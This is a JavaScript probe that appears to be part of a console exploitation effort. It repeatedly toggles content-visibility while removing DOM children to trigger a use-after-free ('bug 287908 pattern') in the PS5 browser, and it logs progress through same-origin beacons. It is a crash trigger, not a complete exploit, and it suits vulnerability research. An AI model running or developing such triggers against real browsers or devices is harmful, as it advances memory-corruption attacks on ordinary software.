// p191 — ISOLATED content-visibility UAF probe (bug 287908 pattern)
// Tests ONLY the content-visibility toggle during DOM mutation
// to confirm if this specific probe crashes PS5
//
// Beacon prefix: V191-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V191-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Confirm content-visibility support first
  var testDiv = document.createElement('div');
  document.body.appendChild(testDiv);
  testDiv.style.contentVisibility = 'hidden';
  var hasCV = (testDiv.style.contentVisibility === 'hidden');
  testDiv.remove();
  syncB('CV-' + (hasCV ? 'YES' : 'NO'));

  if (!hasCV) {
    syncB('ABORT-NO-CV');
    return;
  }

  var container = document.createElement('div');
  container.style.cssText = 'width:200px;height:200px;overflow:hidden;';
  document.body.appendChild(container);

  var alive = true;
  var iterations = 0;
  var MAX_ITER = 500;

  function runCVToggle() {
    if (!alive || iterations >= MAX_ITER) {
      syncB('DONE-' + iterations);
      container.remove();
      return;
    }
    iterations++;

    // Beacon EVERY iteration for first 10, then every 50
    if (iterations <= 10 || iterations % 50 === 0) {
      syncB('ITER-' + iterations);
    }

    // Create child tree
    var wrapper = document.createElement('div');
    wrapper.style.contentVisibility = 'auto';
    wrapper.style.containIntrinsicSize = '0 500px';

    for (var i = 0; i < 10; i++) {
      var child = document.createElement('div');
      child.textContent = 'content ' + i;
      child.style.height = '50px';
      wrapper.appendChild(child);
    }
    container.appendChild(wrapper);

    // Force layout
    void container.offsetHeight;

    // Toggle visibility while removing children
    wrapper.style.contentVisibility = 'hidden';

    while (wrapper.firstChild) {
      wrapper.removeChild(wrapper.firstChild);
    }

    // Toggle back
    wrapper.style.contentVisibility = 'auto';

    // Force another layout
    void container.offsetHeight;

    // Remove the wrapper itself
    wrapper.remove();

    requestAnimationFrame(runCVToggle);
  }

  syncB('PRE-RAF');
  requestAnimationFrame(runCVToggle);
  syncB('POST-RAF-SCHEDULED');

  setTimeout(function() {
    alive = false;
  }, 10000);
})();
